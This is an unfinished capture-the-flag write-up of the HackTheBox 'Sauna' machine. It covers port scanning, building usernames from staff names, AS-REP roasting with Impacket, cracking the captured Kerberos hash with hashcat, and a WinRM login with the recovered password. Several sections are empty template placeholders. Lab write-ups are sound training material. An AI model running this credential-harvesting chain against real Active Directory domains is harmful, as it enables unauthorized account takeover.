# Report - Sauna - HackTheBox

- Author: Henry Post
- Target: Sauna
- Target IP: 10.129.38.113
- Attacker IP: n/a
- Date: 07/15/2026

## Executive Summary



### Recommendations



## Resources

- resource1
- github link
- medium link
- exploit-db link

## Recon

```sh
# port scan
nmap -p- -Pn 10.129.38.113 -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt

# service scan
nmap -Pn 10.129.38.113 -sV -sC -v -oN nmap_sVsC.txt
```

Looks like port 80 (http) is open, and this machine is a domain controller.

http://10.129.38.113 is some bank website. Let's run dirb.

```sh
dirb http://10.129.38.113
```

Actually, let's run `ffuf`.

```sh
sudo apt update && sudo apt install -y seclists

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.38.113/FUZZ
```

Not much interesting stuff.

I'm going to consult an official writeup to speed this up.

We note the hostname from the DC is `EGOTISTICAL-BANK.LOCAL`.

Next, we use `windapsearch` to try to enumerate users.

```sh
wget https://github.com/ropnop/go-windapsearch/releases/download/v0.3.0/windapsearch-linux-amd64

chmod +x ./windapsearch-linux-amd64

./windapsearch-linux-amd64 -d egotistical-bank.local --dc-ip 10.129.38.113 -U

# failure
```

We can also try Impacket's `GetADUsers.py`.

```sh
impacket-GetADUsers egotistical-bank.local/ -dc-ip 10.129.38.113 -debug

# nothing
```

The `smbclient` utility can be used to enumerate shares. Anonymous login is successful, but no shares are returned.

```sh
smbclient -L \\\\10.129.38.113 -N
```

http://10.129.38.113/about.html

This about page has names on it.

We can use a tool such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to create common username permutations based on the full names. After saving the full names to a text file, we run the script. (https://github.com/urbanadventurer/username-anarchy)

```sh
cd ~

echo "Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver" > fullnames.txt

git clone https://github.com/urbanadventurer/username-anarchy/

cd username-anarchy

./username-anarchy --input-file ../fullnames.txt --select-format first,flast,first.last,firstl > ../unames.txt
```

From the guide...

> With our list of common usernames, we can see if Kerberos pre-authentication has been disabled for any of them. Kerberos pre-authentication is a security feature that provides protection against password-guessing attacks. In some cases, applications require this setting to be enabled for their service account (e.g. [Alfresco](https://docs.alfresco.com/5.1/tasks/auth-kerberos-ADconfig.html)). When pre-authentication is not enforced, one could directly send a dummy request for authentication. The Key Distribution Center (KDC) of the Domain Controller will check the authentication service request (AS-REQ), verify the user information and return an encrypted Ticket Granting Ticket (TGT). The TGT contains material (the timestamp) that is encrypted with the NTLM hash of the corresponding account. A hash can be derived from this, that can be subjected to an offline brute force attack in order to reveal the plaintext password.
> 
> Using Impacket's [GetNPUser](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py), we can attempt an ASREPRoasting attack in order to extract a hash from user accounts that do not require [pre-authentication](https://ldapwiki.com/wiki/Kerberos%20Pre-Authentication). A simple bash command can be used to execute this attack, and iterate through the usernames in `unames.txt` .

Okay. Let's try it out.

```sh
while read p; do impacket-GetNPUsers egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.38.113 >> hash.txt; done < unames.txt
```

Success. We get one hit.

```
[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:56f21280771355ecb5c922223dbbd359$6ab788a16d70251e549be47b3dd72cc769ff0310b22da8d0c0161666256432f50df3509f8853bb0a225d04190d41b238e89d7b8069086559d6e2ee49e43ae9b81dce31c343da6c90c6215c88360c082a22231a595f16b5dff07718176b88c93d66848c09757d41e7df703dd90fd1b1ea30c4b4dd2e06e68c8adb92912f1ae4c2f6943191d378d30ce10728c94e6f87079cb78d4fc8836de3b59e8b20f6a76224113b5b2b9647eb2c0d9766a3df50f855cdfecfad0feb7cb499214fcffcab0730d8ec1a2e4164ebb56e1b5ff9c3a205bfa815dd2c584e0d5b293a62c47370fd2d396b4d9e1d6352bb477409cb5bc3838620fba4ae135572b63dbe5d6a54c55442
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

```

> `hashcat` can be used to brute force the password. We can save the hash into a file, and determine the correct hash mode for ASREPRoasting.

```sh
hashcat -hh | grep -i kerberos

<<EOF
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  32100 | Kerberos 5, etype 17, AS-REP                               | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
  32200 | Kerberos 5, etype 18, AS-REP                               | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
EOF
```

> We choose `Kerberos 5 AS-REP etype 23` , i,e. mode `18200` . Next, run hashcat specifying this mode and the rockyou.txt wordlist.

```sh
echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:56f21280771355ecb5c922223dbbd359$6ab788a16d70251e549be47b3dd72cc769ff0310b22da8d0c0161666256432f50df3509f8853bb0a225d04190d41b238e89d7b8069086559d6e2ee49e43ae9b81dce31c343da6c90c6215c88360c082a22231a595f16b5dff07718176b88c93d66848c09757d41e7df703dd90fd1b1ea30c4b4dd2e06e68c8adb92912f1ae4c2f6943191d378d30ce10728c94e6f87079cb78d4fc8836de3b59e8b20f6a76224113b5b2b9647eb2c0d9766a3df50f855cdfecfad0feb7cb499214fcffcab0730d8ec1a2e4164ebb56e1b5ff9c3a205bfa815dd2c584e0d5b293a62c47370fd2d396b4d9e1d6352bb477409cb5bc3838620fba4ae135572b63dbe5d6a54c55442' > hash.txt

hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force
```

Output is `Thestrokes23`. Great.

## Local Access
### WinRM

> With the gained credentials fsmith / Thestrokes23 we can try to login using WinRM (port 5985). Windows Remote Management (WinRM), is a Windows-native built-in remote management protocol and it is often enabled for users that need to manage systems remotely. We can use [evilwinrm](https://github.com/Hackplayers/evil-winrm) to connect to the remote system

```sh
evil-winrm -i 10.129.38.113 -u fsmith -p 'Thestrokes23'
```

We have non-SYSTEM pwn :)
## Root access


## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`

![](Pasted%20image%2020260715145355.png)

### Root proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat proof.txt`
(IMG_PLACEHOLDER)
